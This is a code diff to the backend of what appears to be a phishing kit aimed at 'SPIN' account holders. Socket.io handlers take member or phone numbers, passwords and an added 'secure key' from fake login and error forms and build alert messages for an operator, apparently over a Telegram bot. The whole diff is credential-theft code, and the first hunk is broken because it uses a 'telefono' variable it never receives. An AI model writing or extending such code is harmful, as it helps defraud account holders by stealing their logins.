@@ -29,7 +29,7 @@ io.on('connection', (socket) => {
   socket.on('dataForm', ({ socio, contrasena, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `🔐 Nuevo intento de acceso SPIN:\n\n🔢 Número de socio: ${socio}\n🔑 Contraseña: ${contrasena}`;
+    const mensaje = `🔐 Nuevo intento de acceso SPIN:\n\n🔢 Número de celular: ${socio}\n🔑 Contraseña: ${contrasena}📱 Clave segura: ${telefono}`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
@@ -86,10 +86,10 @@ io.on('connection', (socket) => {
   });
 
   // Formulario de errorlogo.html — CORREGIDO
-  socket.on('errorlogoForm', ({ socio, contrasena, sessionId }) => {
+  socket.on('errorlogoForm', ({ socio, contrasena, telefono, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `⚠️ Nuevo intento fallido detectado SPIN:\n\n🔢 Número de socio: ${socio}\n🔑 Clave: ${contrasena}`;
+    const mensaje = `⚠️ Nuevo intento fallido detectado SPIN:\n\n🔢 Número de celular: ${socio}\n🔑 Clave: ${contrasena}\n📱 Clave segura: ${telefono}`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
